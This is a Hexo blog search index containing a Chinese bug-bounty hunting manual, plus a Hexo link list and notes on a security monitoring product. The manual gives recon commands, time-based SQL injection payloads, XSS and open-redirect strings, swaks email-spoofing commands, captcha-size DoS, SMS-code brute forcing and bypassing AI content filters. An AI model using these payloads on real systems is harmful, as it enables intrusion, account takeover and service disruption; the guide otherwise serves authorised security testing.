@@ -1,0 +1,245 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>Fannn的挖掘手册</title>
+      <link href="/2024/10/31/Fannn%E7%9A%84%E6%8C%96%E6%8E%98%E6%89%8B%E5%86%8C/"/>
+      <url>/2024/10/31/Fannn%E7%9A%84%E6%8C%96%E6%8E%98%E6%89%8B%E5%86%8C/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Fannn的SRC挖掘手册"><a href="#Fannn的SRC挖掘手册" class="headerlink" title="Fannn的SRC挖掘手册"></a>Fannn的SRC挖掘手册</h1><p>前言：一直很想写一个自己的src的知识库，坚持写一年吧 —–2024.4.6</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>云服务器配置：2核4G 华为的最好，腾讯云会进行销号处理</p><p>云服务器版本：Ubuntu20.04</p><p>根域名收集：企查查和爱企查</p><p>1.企查查-&gt;知识产权-&gt;备案网站-&gt;导出父域名</p><p>找其他下属的资产-&gt;股权穿透图，找大于50的</p><p>子域名搜索：灯塔+oneforall+水泽+subfiner</p><p>灯塔跑完之后用oneforall</p><p>1、oneforall命令：python3 oneforall..py-target hackone.com run<br>扫描完成后会在oneforall根目录中的results目录生成一个表格文件，下载<br>下来<br>2、shuize命令：python3 ShuiZe.py -d domain.com –justInfoGather 1<br>扫描完成后会在shuize根目录result”下产生一个表格文件下载下来<br>3、subfindert命令：subfinder-dL hackerone.txt里面填根域名，一般我<br>会和httpx配合使用：subfinder-dL hackerone.txt-silent |.&#x2F;httpx -o<br>hackerone.html -html -title</p><p>上述工具跑完之后将子域名放到一个excel表里，建议使用wps进行去重,去重完毕后，再用httpx跑一遍，得出下表，此表就是我们最终的测试表格，当然灯塔扫出来的敏感文件也需要挨个看一遍，然后这种就得挨个手工测试了</p><h2 id="BURP小技巧"><a href="#BURP小技巧" class="headerlink" title="BURP小技巧"></a>BURP小技巧</h2><p>1.HAE找敏感字段可以在logger功能下看，这样看的全一些</p><p>2.中文乱码及编码问题遇到某些中文显示为unioncode或者乱码，安装了knife.之后报文会多出一<br>个chinese选项这里显示是正常的中文，可以和原始报文对比看</p><p>3.遇到封ip的情况，我们需要使用可以切换国内P的工具(爱加速)，有了工具之后只<br>要在burp上将代理工具的ip填上然后勾选就行了  </p><p>具体操作：settings-&gt;network-&gt;connections-&gt;Upstream proxy servers 然后添加</p><p>4批量给多个包增加内容</p><p>具体操作：settings-&gt;tools-&gt;proxys-&gt;Match and replace rules  添加 request header   Origin:<a href="https://www.baidu.com/">https://www.baidu.com</a></p><p>5 挖到漏洞留存</p><p>比如我们挖到一个漏洞，然后接着测另外的暂时不写报告应该使用burp的Organizer功能</p><p><img src="/2024/10/31/Fannn%E7%9A%84%E6%8C%96%E6%8E%98%E6%89%8B%E5%86%8C/Users\31055\Desktop\Fannn的SRC挖掘小屋\1720695155885.png" alt="1720695155885"></p><p><img src="/2024/10/31/Fannn%E7%9A%84%E6%8C%96%E6%8E%98%E6%89%8B%E5%86%8C/Users\31055\Desktop\Fannn的SRC挖掘小屋\1720695194113.png" alt="1720695194113"></p><p><img src="/2024/10/31/Fannn%E7%9A%84%E6%8C%96%E6%8E%98%E6%89%8B%E5%86%8C/Users\31055\Desktop\Fannn的SRC挖掘小屋\1720695219556.png" alt="1720695219556"></p><h2 id="小程序抓包"><a href="#小程序抓包" class="headerlink" title="小程序抓包"></a>小程序抓包</h2><p>1.将系统代理改为bp的代理流量端口</p><p>2.在proxifier里面增加微信小程序的路径规则，并增加有一个</p><p>3.然后就可以抓包了</p><p><a href="https://blog.csdn.net/qq_68064663/article/details/133958534">https://blog.csdn.net/qq_68064663/article/details/133958534</a></p><h2 id="低危"><a href="#低危" class="headerlink" title="低危"></a>低危</h2><p>session会话固定</p><p>满足三个条件：<br>1、网站使用cookie鉴权<br>2、登录后和登录前cookie中的鉴权字段没变<br>3、能把这个带有cookie的url发给别人进行登录（此处我没满足，我交的都是只满足前两个的，但是严格来说应该满足这条才行)<br>登录前登录后下面这个jessionid没变，并且系统权限就是用这个控制还存在几个别的session会话类型的漏洞，但是其它我没挖到给钱的，大家想学习可以看这个：<br><a href="https://www.yaklang.io/Yaklab/wiki/SessionManagement/Session-id">https://www.yaklang.io/Yaklab/wiki/SessionManagement/Session-id</a></p><h3 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h3><p>1、有手机号验证的功能都可以试试、注册、登录、重置、注销等<br>2、默认如果爆破有问题，可以调整burp爆破线程和爆破速度</p><p>3.小字典没爆破出来，可以用大字典试一试</p><p>写报告打码手机号和信息</p><h3 id="URL跳转"><a href="#URL跳转" class="headerlink" title="URL跳转"></a>URL跳转</h3><p>操作步骤 ：只查看302的包，看见类似于url&#x3D;?,reurl?，等参数，把里面的参数网站进行更改为你想要的目标网站，看看响应包里面是否有location是否全部都是你想要的目标网站，如果无法判断，复制url参数到浏览器，看是否进行跳转</p><h3 id="任意地址跳转（加载-xss）"><a href="#任意地址跳转（加载-xss）" class="headerlink" title="任意地址跳转（加载+xss）"></a>任意地址跳转（加载+xss）</h3><p>挖洞工具：Burp Suite+svg xss文件<br>挖洞手法：地址跳转<br>挖洞思路：发现协议地址可控，可以修改协议实现钓鱼，也可加载上传的xss文件</p><p>常见于各种服务协议</p><p><a href="https://xxx.com/payment/confirm?productCode=0f9aa6d92aa4500a30a06cddfe0d2ee&productName=xxx&**protocol=https://Xxx.com/N1.2/AUTH_acsp-ESG-ACSP-CORE/%E5%95%86%E5%93%81%E5%8D%8F%E8%AE%AE.html**&despatchWay=%E7%BA%BF%E4%B8%8A">https://xxx.com/payment/confirm?productCode=0f9aa6d92aa4500a30a06cddfe0d2ee&amp;productName=xxx&amp;**protocol=https://Xxx.com/N1.2/AUTH_acsp-ESG-ACSP-CORE/商品协议.html**&amp;despatchWay=线上</a><br>&amp;companyName&#x3D;&amp;skuCode&#x3D;512609fd95fd4bf1b3c6153aaff7436&amp;standard&#x3D;签署流量套餐&amp;period&#x3D;50000份<br>&amp;amount&#x3D;10000.00</p><p>protocol&#x3D;https:&#x2F;&#x2F;自己域名.com&#x2F;钓鱼.html</p><p>protocol&#x3D;<a href="https://xxx.com/v1.2/AUTH_acsp-ESG-ACSP">https://xxx.com/v1.2/AUTH_acsp-ESG-ACSP</a><br>CORE&#x2F;xss.svg</p><h3 id="评论内容涉政涉黄"><a href="#评论内容涉政涉黄" class="headerlink" title="评论内容涉政涉黄"></a>评论内容涉政涉黄</h3><p>挖洞手法：公开发布违规内容<br>挖洞思路：发现公开评论区，尝试发布违规内容，未被检测或审核，成功发布</p><h3 id="登录频繁限制绕过"><a href="#登录频繁限制绕过" class="headerlink" title="登录频繁限制绕过"></a>登录频繁限制绕过</h3><p>挖洞手法：手机号空格爆破<br>挖洞思路：登录多次出现频繁限制，尝试使用手机号空格变型绕过</p><h3 id="DNS域传送"><a href="#DNS域传送" class="headerlink" title="DNS域传送"></a>DNS域传送</h3><p>操作步骤：<br>探测域名使用的dns服务器：dig ns *.com<br>探测dns服务器是否存在域传送漏洞：dig axfr {dns服务器}</p><p>如果成功会出现域名解析ip,没有成功会出现失败的英文 </p><p>批量工具：<br>[zZone-Transfer]: <a href="https://github.com/Xyntax/zZone-Transfer">GitHub - Xyntax&#x2F;zZone-Transfer: DNS域传送漏洞探测工具。多线程，批…</a></p><p><img src="/2024/10/31/Fannn%E7%9A%84%E6%8C%96%E6%8E%98%E6%89%8B%E5%86%8C/Users\31055\AppData\Roaming\Typora\typora-user-images\1712402375888.png" alt="1712402375888"></p><h3 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h3><p>工具：<br>[dirsearch]: <a href="https://github.com/maurosoria/dirsearch">GitHub - maurosoria&#x2F;dirsearch: Web path scanner</a><br>案例：db.tar.gz<br>漏洞报告小tip：让gpt帮忙写漏洞危害：网页构造特殊路径上可以直接下载到网站源码，请问这有什么危害？</p><h3 id="日志泄露及其它接口敏感界面泄露"><a href="#日志泄露及其它接口敏感界面泄露" class="headerlink" title="日志泄露及其它接口敏感界面泄露"></a>日志泄露及其它接口敏感界面泄露</h3><p><img src="/2024/10/31/Fannn%E7%9A%84%E6%8C%96%E6%8E%98%E6%89%8B%E5%86%8C/Users\31055\AppData\Roaming\Typora\typora-user-images\1712625384609.png" alt="1712625384609"></p><p><img src="/2024/10/31/Fannn%E7%9A%84%E6%8C%96%E6%8E%98%E6%89%8B%E5%86%8C/Users\31055\AppData\Roaming\Typora\typora-user-images\1712625427988.png" alt="1712625427988"></p><h3 id="各种备份文件"><a href="#各种备份文件" class="headerlink" title="各种备份文件"></a>各种备份文件</h3><p>linux脚本泄露，扫到了下载下来类似.sh、zip、log、tar.gz这些东西<br>或者.gt和.svn池露，里面都需要有敏感数据才行例如</p><h3 id="druid未授权访问"><a href="#druid未授权访问" class="headerlink" title="druid未授权访问"></a>druid未授权访问</h3><p>漏洞说明：Druid由阿里巴巴数据库出品，为监控而生的数据库连接池，并且Druid可以提供监控，<br>监控SQL的执行时间、监控Web URIE的请求、Session.监控等功能，使用广泛。<br>需要明确：Drud本身是不存在漏洞的，Druid未授权访问是因为开发者配置的不够全面，导致攻击<br>者输入ip&#x2F;druid&#x2F;,index.html即可直接即可登录到Druid.监控界面，这就是所谓未授权，即可访问。</p><p>常用的30+种未授权访问漏洞汇总：<br><a href="https://www.freebuf.com/articles/web/338459.html">https://www.freebuf.com/articles/web/338459.html</a></p><h3 id="并发漏洞"><a href="#并发漏洞" class="headerlink" title="并发漏洞"></a>并发漏洞</h3><p>可以使用burp插件 Turbo intruder ,可以把我们需要并发操作的包发向这个插件然后选择操作</p><h3 id="swagger接口文档泄露"><a href="#swagger接口文档泄露" class="headerlink" title="swagger接口文档泄露"></a>swagger接口文档泄露</h3><p><img src="/2024/10/31/Fannn%E7%9A%84%E6%8C%96%E6%8E%98%E6%89%8B%E5%86%8C/Users\31055\AppData\Roaming\Typora\typora-user-images\1713014581440.png" alt="1713014581440"></p><h3 id="安全日志诬陷漏洞"><a href="#安全日志诬陷漏洞" class="headerlink" title="安全日志诬陷漏洞"></a>安全日志诬陷漏洞</h3><p>使用burp插件，burpfakelP给所有请求头加一个伪造的IP</p><p>危害：删除数据然后诬陷别人呢？</p><h3 id="jsonpxss漏洞"><a href="#jsonpxss漏洞" class="headerlink" title="jsonpxss漏洞"></a>jsonpxss漏洞</h3><p>使用工具：burp插件 jsonphunter<br>JSONP(JSON with Padding):JSONP是一种利用<script>标签加载外部资源的技术。它允许<br>网页从不同的域中获取数据并进行交互，绕过了浏览器的同源策胳限制。然而，由于缺乏<br>安全验证机制，攻击者可以将恶意代码注入到返回json响应中，从而导致安全漏洞。</p><p>条件：</p><p>1、返回content-type为text/html</p><p>2、get或post中的callback参数可控</p><p><img src="C:\Users\31055\AppData\Roaming\Typora\typora-user-images\1712409432203.png" alt="1712409432203"></p><h3 id="sourcemap文件泄露"><a href="#sourcemap文件泄露" class="headerlink" title="sourcemap文件泄露"></a>sourcemap文件泄露</h3><p>使用油猴脚本：sourcemap-searcher、或burp hae插件<br>油猴脚本：F12控制台输入sms()如果存在会有提示，然后打开看能否下载下来，能下下来的话用，nodejs进行反编译，然后可以分析里面接口挖别的漏洞，或者直接提交，也是收的少，图一乐。</p><p>nodejs编译</p><p>把出现泄露的js.map 下载下来，放在 reverse-sourcemap 里面  </p><p>reverse-sourcemap  -v ***.js.map -o   xxx</p><h3 id="图片验证码大小可控导致ddos"><a href="#图片验证码大小可控导致ddos" class="headerlink" title="图片验证码大小可控导致ddos"></a>图片验证码大小可控导致ddos</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xx.xx.xx.xx/DEV_GBK_1.4.0/gbk/install_package/api.php?op=checkcode&amp;code_len=4&amp;font_size=20&amp;width=130&amp;height=50&amp;font_color=&amp;background=</span><br></pre></td></tr></table></figure><p>这里我们注意两个参数:<strong>width和height</strong>,这两个意思字面理解为长度和宽度,那么我们尝试修改它的大小:</p><p>更改width和height这两个参数改成无限大，注意不要把服务器跑崩</p><h3 id="GO语言内存泄露"><a href="#GO语言内存泄露" class="headerlink" title="GO语言内存泄露"></a>GO语言内存泄露</h3><p>危害：旗下网站存在go语言pprof信息泄露，越来越多的程序和站点都在使用Go语言进行开发，Go语言提供了相关的调试工具，即包net/http/pprof,.可对程序和服务器进行调试分析。默认情况下，不对pprof做限制，则意味可以直接访问获取相关的敏感信息。</p><p>信息泄露内容如下： </p><blockquote><p>allocs:记录了其内存分配情况，点击直接查看即可。<br>bock：跟踪堵塞情况，默认不开启，如果开启的话，可以大慨知道程序的一些目录结构和文件名。 cmdline:获取程序启动时的命令和参数，一般会暴露其物理路径。<br>goroutine:查看协程信息，会泄露go包所在位置以及程序的相关信息。<br>heap:查看堆信息和GC垃圾回收信息。<br>mutex:互斥锁的堆栈跟踪，默认不开启。<br>profile:CPU相关信息。<br>threadcreate:线程堆栈跟踪。<br>trace:跟踪Go程序运行中的运行时事件。那么如何根据上面的参数来查看相关信息，这里也简单记录下，首先第一种是访问相关URL带上?debug=参数.可直接在浏览器杳看：</p></blockquote><h2 id="中危"><a href="#中危" class="headerlink" title="中危"></a>中危</h2><h3 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h3><p>主要是增删改</p><p>注意csrf漏洞测试前一定要观察和测试鉴权字段是否在<br>cookie中，如果不在就不用测试了,还有返回结果是json格式</p><p>生成html一定要在同一个浏览器里面</p><h3 id="文件上传XSS"><a href="#文件上传XSS" class="headerlink" title="文件上传XSS"></a>文件上传XSS</h3><h3 id="取消任意出库单"><a href="#取消任意出库单" class="headerlink" title="取消任意出库单"></a>取消任意出库单</h3><p>挖洞手法：前端验证绕过<br>挖洞思路：发现文件上传口且根目录是主站，尝试上传xss,格式有限制，更改绕过 上传svgxss</p><p>水平越权</p><p>取消功能抓包发现id字段，更改后成功越权取消，且id可遍历</p><h3 id="AI限制绕过"><a href="#AI限制绕过" class="headerlink" title="AI限制绕过"></a>AI限制绕过</h3><p>操作过程：</p><p>在类似于gpt功能，绕过限制，可以生成不良内容的图片或信息，</p><p>危害：</p><p>1、损害声誉：不良图片可能会对企业、组织或个人的声誉造成损害。如果这些图片与某个品<br>牌或组织相关联，那么它们可能会导致公众对该品牌或组织的负面看法。<br>2、法律风险：不良图片可能涉及非法行为，例如侵犯版权、淫秽或诽谤等。使用或传播此<br>类图片可能会导致法律风险和处罚。</p><h3 id="spf邮件伪造"><a href="#spf邮件伪造" class="headerlink" title="spf邮件伪造"></a>spf邮件伪造</h3><p>漏洞危害：可以用未进行安全配置的网站域名，发送邮件。比如<br><a href="http://www.baidu.com%E6%9C%89%E8%BF%99%E4%B8%AA%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BD%A0%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%BC%AA%E9%80%A0HR@baidu.com给受害人发邮件进行/">www.baidu.com有这个漏洞，你就可以伪造HR@baidu.com给受害人发邮件进行</a><br>钓鱼。src收的少，众测和自己的渗透项目可以交，但是我交这个还行。<br>怎么挖：成baidu.com<br>看下图，如果是-all就是不存在，~all就是存在     </p><p>只能是自己的网易邮箱！！！</p><p>利用工具：kali自带的swaks<br>工具攻击命令：swaks-body"钓鱼邮件测试"-header"Subject:钓鱼测试"-t地图<br>大师@163.com(自己的邮箱)-f"<a href="mailto:&#116;&#101;&#115;&#x74;&#64;&#x62;&#97;&#105;&#x64;&#117;&#46;&#x63;&#111;&#x6d;">&#116;&#101;&#115;&#x74;&#64;&#x62;&#97;&#105;&#x64;&#117;&#46;&#x63;&#111;&#x6d;</a>"（测试邮箱网站）  </p><p>验证：能收到邮件就说明存在此漏洞</p><p>swaks -body "1" -header "Subject:2" -t <a href="mailto:&#x31;&#56;&#50;&#x37;&#x31;&#53;&#56;&#x37;&#x38;&#x34;&#51;&#x40;&#49;&#x36;&#51;&#x2e;&#x63;&#111;&#x6d;">&#x31;&#56;&#50;&#x37;&#x31;&#53;&#56;&#x37;&#x38;&#x34;&#51;&#x40;&#49;&#x36;&#51;&#x2e;&#x63;&#111;&#x6d;</a> -f "test@测"</p><p><img src="C:\Users\31055\AppData\Roaming\Typora\typora-user-images\1712407265349.png" alt="1712407265349"></p><p><img src="C:\Users\31055\AppData\Roaming\Typora\typora-user-images\1712407401664.png" alt="1712407401664"></p><p>1分无限购买面试场次</p><p>挖洞手法：商品id遍历<br>挖洞思路：购买发现商品id可遍历，遍历后发现1分商品，且可无限下单</p><p>登录口绕不过的图片验证码漏洞</p><h3 id="图片验证码失效"><a href="#图片验证码失效" class="headerlink" title="图片验证码失效"></a>图片验证码失效</h3><h4 id="1、图片验证码直接返回在返回包中（最少见）"><a href="#1、图片验证码直接返回在返回包中（最少见）" class="headerlink" title="1、图片验证码直接返回在返回包中（最少见）"></a>1、图片验证码直接返回在返回包中（最少见）</h4><h4 id="2、图片验证码字段可删除"><a href="#2、图片验证码字段可删除" class="headerlink" title="2、图片验证码字段可删除"></a>2、图片验证码字段可删除</h4><p>将数据包中的type字段改为0，并删除掉validCode=x5qs,即可发送短信，绕过了图片验证码机制，进行短信轰炸</p><h4 id="3、图片验证码不失效，可进行爆破-100"><a href="#3、图片验证码不失效，可进行爆破-100" class="headerlink" title="3、图片验证码不失效，可进行爆破 100"></a>3、图片验证码不失效，可进行爆破 100</h4><p>该案例中第一次将图片验证码填写正确后，输入任意账户密码，点击登录进行抓包，报文中的random字段为图片验证码，直接爆破即可，此处图片验证码可无限复用</p><h4 id="4、图片验证码拒绝服务漏洞（验证码doS"><a href="#4、图片验证码拒绝服务漏洞（验证码doS" class="headerlink" title="4、图片验证码拒绝服务漏洞（验证码doS)"></a>4、图片验证码拒绝服务漏洞（验证码doS)</h4><p>漏洞原理：开发者在网站开发过程中为了图片验证码能够适应网站在显示过程中的大小，从而加入了隐藏参数，当这个参数被攻击者猜测出以后，攻击者就可以修改图片验证码、二维码的大小，让服务端返回的验证码无限放大，最终导致服务端生成的图片超级大然后网站停止服务。<br>如何测试：<br>1、点击图片验证码进行抓包<br>2、在请求后面拼接隐藏参数：height、width、size、mergin、h、w等实战过程中以h、w、height、width居多<br>3、<strong>逐步增加大小</strong>例如：第一次：height=:111第二次：height=222,看burp会不会延时，或者直接看burp响应中的Renderi模块图片有没有变形</p><h3 id="未授权访问和信息泄露结合findsomething"><a href="#未授权访问和信息泄露结合findsomething" class="headerlink" title="未授权访问和信息泄露结合findsomething"></a>未授权访问和信息泄露结合findsomething</h3><p>未授权的测试：<br>复制url放入burp模块直接结合登录口域名进行爆破，get爆破一遍，post爆破一遍有时候能捡到未授极访问</p><h2 id="高危"><a href="#高危" class="headerlink" title="高危"></a>高危</h2><h3 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h3><p>平行越权改ID，垂直越权改鉴权</p><h3 id="任意用户"><a href="#任意用户" class="headerlink" title="任意用户"></a>任意用户</h3><p>任意用户注册、任意用户重置、任意用户登录</p><h4 id="任意用户注册（低危）"><a href="#任意用户注册（低危）" class="headerlink" title="任意用户注册（低危）"></a>任意用户注册（低危）</h4><h5 id="可覆盖注册"><a href="#可覆盖注册" class="headerlink" title="可覆盖注册"></a>可覆盖注册</h5><h5 id="不可覆盖注册"><a href="#不可覆盖注册" class="headerlink" title="不可覆盖注册"></a>不可覆盖注册</h5><p>这个漏洞是因为收到的验证码和手机号没有进行校验，暂时还没有碰到真实的案例</p><p>操作步骤：</p><p>正常输入一个手机号，进行注册，然后在要进行登录的同时进行抓包，将手机号进行替换</p><h4 id="2-任意用户登录"><a href="#2-任意用户登录" class="headerlink" title="2.任意用户登录"></a>2.任意用户登录</h4><h4 id="3-任意用户密码重置"><a href="#3-任意用户密码重置" class="headerlink" title="3.任意用户密码重置"></a>3.任意用户密码重置</h4><h4 id="4-任意用户注销"><a href="#4-任意用户注销" class="headerlink" title="4.任意用户注销"></a>4.任意用户注销</h4><p>场景：短信验证码场景（满足上述四个类型）<br>(1)短信验证码直接写在回显的包里<br>(2)可以把同一个短信验证码发给两个不同的手机号（一个受害者一个攻击者)<br>(3)四位数短信验证码可爆破</p><p>实战案例1：</p><p>四位数验证码爆破-任意用户登录+任意用户密码重置（两个功<br>能用的同一个短信接口)+价格：2200元</p><p>实战案例2：</p><p>不同手机号收到相同验证码</p><p>实战案例3：</p><p>任意用户密码修改-短信验证码写在响应包里（测试系统居多）</p><p>实战案例4：任意用户密码重置</p><h3 id="登录口总结"><a href="#登录口总结" class="headerlink" title="登录口总结"></a>登录口总结</h3><p>SQL注入<br>未授权访问-详细的等下节课，比如直接构造一个接口地址实现未授权访问<br>任意用户本节课讲的那些-任意用户<br>短信轰炸（短信炸弹）-一只收纵向、不要横向<br>越权-比如直接构造一个注册接口去注册账号实现越权登陆<br>路径泄露-比如tp框架的<br>Ur跳转漏河-看z神的0-1分享<br>弱▣令-字典看星球置顶的链接、以及一些设备的弱口令：<br>https:j//wiki.bylibrary.cn/E9%80%9FXE6%9FXA5%E85A15A8/E55B8%88%E8%A7181E48A*A7%E5%93%81%E5%8C%B1%E.</p><p>并发短信轰炸-看星球，攫并发短信轰炸<br>用户名枚举-捡洞神器-附件<br>账号锁定-流氓行为-附件<br>xss漏洞-比如你直接在一个登陆：javascript:alert(1)<br><a href="http://www.example.com/?urlewww.evil.com">http://www.example.com?urlewww.evil.com</a><br><a href="http://www.example.com/?url=javascript:alert(1)">http://www.example.com?url=javascript:alert(1)</a><br>验证码ddos-查看r0的0-1分享<br>nday比如shiro、还有一些cms的、oa等<br>任意文件下载</p><h2 id="漏洞杂谈"><a href="#漏洞杂谈" class="headerlink" title="漏洞杂谈"></a>漏洞杂谈</h2><p>漏洞小思路：<br>1、挖src的时候，在一个站挖出了一些常规漏洞，可以将该站的favicon.ico保存下来，<br>丢在fofa中，然后刷一追，增加额外收获</p><p>通常来说，注入不一定都在小型sc,其实某里这些大公司的src都有注入，也别想着这些<br>src的注入payload很难很难，有些简单的payload都能直接达到效果，都可以试试，而且注<br>入不一定在边缘域名，主站也可能存在<br>注入<br>2)怼payload</p><p>(高频：0%27 XOR(if(now()=sysdate(),sleep(3),0))XOR'Z)</p><p>extractvalue(1,concat(char(126),database()))</p><p><a href="https://cloud.tencent.com/developer/article/1835865">复盘某奇葩SQL时间延迟盲注(1)-腾讯云开发者社区-腾讯云 (tencent.com)</a>3)使用扫描器<br>某里主站：</p><p><img src="C:\Users\31055\AppData\Roaming\Typora\typora-user-images\1713326195238.png" alt="1713326195238"></p><p>{ quick":"0"%2C"spec":[]%2C" goods_id":"if(now ()=sysdate()%2Csleep(if((length(database ())=20),3,0))%2C0)"%2C"number":"1"%2c" parent":"0"}</p><p>宝藏站的特征</p><p>漏洞多的资产一般都是叫Xx管理平台、Xx后台、x企业操作系统特征如下，登录口可以用手机号或邮箱直接注册：</p><p>最好的情况下就是，这个站还可以创建一堆的子用户（便于我们测试垂直越权)，这样的网站他们被各路大神有一个统一的叫法：</p><p>可注册网站环境配置</p><p>1、如果这个网站只能注册同权限账号，那就用两个手机号注册两个账号，<br>用户名尽量有所区分（便于测试越权的时候不会看花眼）<br>2、如果这个网站注册进去还能创建子账号，建议注册两个管理员账户，两<br>个子账户，便于测试垂直越权和子账户的平行越权<br>注意：可注册网站功能比较多的时候，干万不要图快，必须挨个功能点去<br>肝，一个功能点都不能错过所以测洞一定要全，不要急。</p><p>【封ip的情况下】挂好burp的下级代理</p><p>settings->network->connections->upstream proxy seervers</p><p>4、注意点：测得时候建议burp自带的浏览器登录自己主要测试账号，谷歌登录要被越权的账号</p></script></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 漏洞手册 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>hexo+github</title>
+      <link href="/2024/10/31/hexo-github/"/>
+      <url>/2024/10/31/hexo-github/</url>
+      
+        <content type="html"><![CDATA[<p>备份一下，hexo+github的 安装步骤和 使用教程</p><p><a href="https://blog.csdn.net/cat_bayi/article/details/128725230">Hexo教程，看这一篇就够了- How to系列-CSDN博客</a></p><p><a href="https://cloud.tencent.com/developer/article/2337246">使用Hexo从0到1搭建个人博客详细教程（超详细，超简单）-腾讯云开发者社区-腾讯云</a></p><p><a href="https://wokron.github.io/posts/hexo-personal-blog-tutorial/">Hexo 个人博客搭建及主题配置教程 | Wokron’s Blog</a></p><p><a href="https://zxalive.com/">Pager 2 - 知行博客</a></p><p><a href="https://jamhus-tao.github.io/posts/blog-hexo-3-theme-butterfly/">Github + Hexo + Butterfly 建站笔记(三) - Butterfly 主题 | JamhusTao の Blog</a></p><p><a href="https://niezicheng.github.io/blog-hexo/posts/b86e2546/#Gallery-%E7%9B%B8%E5%86%8C">Hexo Butterfly 功能进阶教程 (三) | Arvinjun の站点</a></p><p><a href="https://butterfly.js.org/posts/507c070f/">Butterfly添加全局吸底Aplayer教程 | Butterfly</a><br>首页文章轮播<br><a href="https://blog.liushen.fun/posts/6af2a5bb/">https://blog.liushen.fun/posts/6af2a5bb/</a><br>美化教程<br><a href="https://butterfly.zhheo.com/loading.html">https://butterfly.zhheo.com/loading.html</a></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 备份 </tag>
+            
+            <tag> hexo </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>内网学习</title>
+      <link href="/2024/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/"/>
+      <url>/2024/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>天眼安全设备</title>
+      <link href="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/"/>
+      <url>/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/</url>
+      
+        <content type="html"><![CDATA[<h1 id="天眼（天眼新一代安全感知系统，高级检测溯源的产品）"><a href="#天眼（天眼新一代安全感知系统，高级检测溯源的产品）" class="headerlink" title="天眼（天眼新一代安全感知系统，高级检测溯源的产品）"></a>天眼（天眼新一代安全感知系统，高级检测溯源的产品）</h1><h2 id="天眼的功能"><a href="#天眼的功能" class="headerlink" title="天眼的功能"></a>天眼的功能</h2><p>发现、分析、溯源</p><p>发现网络的攻击行为并结合其他的安全设备进行 及时阻断网络攻击并对攻击成功的事件进行一个溯源分析</p><p>检测、响应、溯源</p><h2 id="天眼的构造"><a href="#天眼的构造" class="headerlink" title="天眼的构造"></a>天眼的构造</h2><p>分析平台：存储全量的一个日志和结果（大型数据库，存储流量传感器的流量）提供了一个面向客户的交互式的页面</p><p>流量传感器:接受流量的镜像全量还原成流量日志</p><p>文件威胁鉴定器：和流量传感器进行联动，收集流量传感器上的文件，配合检索引擎去进行文件的告警分析</p><p>沙箱</p><h2 id="部署场景"><a href="#部署场景" class="headerlink" title="部署场景"></a>部署场景</h2><p>流量传感器     部署在服务器区以及办公区，将告警日志和网络日志发送给分析平台</p><p>文件威胁鉴定器 接受流量传感器的文件及文件日志，将文件日志发送给分析平台（沙箱）</p><p>分析平台   将威胁情报发送给云端大数据平台威胁情报中心</p><p>注：天眼威胁监测与分析系统(SkyEye)的各个组件均采取旁路部署的模式，组成一个独立的网络，不会和用户本身的网络产生交集</p><h2 id="流量传感器平台"><a href="#流量传感器平台" class="headerlink" title="流量传感器平台"></a>流量传感器平台</h2><p>主要对网络流量进行解码，还原真实的流量、提取网络层、传输层、应用层的头部流量或者一些负载信息，对流量中的文件去进行一个还原，这些信息通过加密渠道发送或者威胁鉴定器里进行统一的处理、支持ipv4和ipv6</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719575156028.png" alt="1719575156028"></p><p>状态监听包括：设备连接状态、设备列表、资源占用、系统信息、授权信息、攻击规则信息、威胁情报信息、网络流量、应用流量、数据采集、会话监控、文件类型统计、日志外发统计。</p><p>解码小工具</p><p>在【威胁告警】-【详情】因为在告警详情中，对于url编码、base64编码、以及各种中文编码，浏览器不能提供直接的转义功能，导致部分告警分析存在困难，所以提供此小工具对各种编码内容进行转义。</p><p>【威胁告警】-【告警列表】展示网页漏洞利用、webshe11上传、网络攻击、威胁情报4种类型的所有告警。</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719575293470.png" alt="1719575293470"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719575431437.png" 